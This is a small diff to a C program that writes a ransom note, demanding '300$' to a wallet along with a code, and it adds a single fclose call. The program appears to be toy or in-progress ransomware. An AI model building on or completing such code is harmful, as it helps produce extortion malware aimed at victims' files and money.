@@ -46,6 +46,7 @@ int main(int argc, char **argv)
 			"\nNow you pay me 300$ on DeepDarkFantasy wallet."
 			"\n\nDon't forget to attach this code: %s."
 			"\n[REPLACE THIS WITH A 32 CHARACTER PASSWORD]", code);
+		fclose(txtFile);
 	}
 
 	return 0;
